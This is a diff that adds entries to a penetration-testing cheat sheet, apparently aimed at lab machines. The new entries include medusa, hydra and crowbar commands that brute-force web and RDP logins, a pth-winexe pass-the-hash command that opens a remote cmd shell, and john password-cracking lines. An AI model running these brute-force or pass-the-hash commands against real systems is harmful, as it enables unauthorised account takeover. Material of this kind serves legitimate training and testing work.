@@ -565,10 +565,20 @@ nmap -sU 10.10.10.116 # UDP
 
 
 # Brute Forcing
-## hydra
+## medusa
+```
+medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
+```
 
+## hydra
+Get help for service module
+```
+hydra http-form-post -U
+```
+Example:
 ```
 hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
+# use -f to stop the attack once a result is found
 ```
 
 Where first field (delimited by :)  is URL. Second field contains parameters and third contains a string within the response from webpage which indicates that the login failed.
@@ -579,7 +589,17 @@ wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d ’us
 wfuzz --hc 404 -c -z file,big.txt http://10.10.26.165/site-log.php\?date=FUZZ
 ```
 
+## RDP
+* [crowbar](https://github.com/galkan/crowbar)
+```
+crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
+```
+
 # Cracking
+## Identify Hash
+* [hash-identifier](https://psypanda.github.io/hashID/)
+* [Sample Password Hashes](https://openwall.info/wiki/john/sample-hashes)
+
 ## Example MD5 Hash
 
 ```
@@ -842,6 +862,11 @@ Use NTHASH (LMHASH:NTHASH)
 
 ```
 crackmapexec 192.168.92.0/24 -u "Elliot Alderson" -H 64f12cdda88057e06a81b54e73b949b --local
+```
+
+Alternative: [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+```
+pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.10.10.22 cmd
 ```
 
 ## Shell Access Whith NTLM Hash
@@ -1366,6 +1391,7 @@ dnsrecon -d domain -t axfr
 ```
 python3 ssh2john.py id_rsa > id_rsa.hash
 john id_rsa.hash --wordlist=<wordlist>
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
 ```
 
 # Word Press
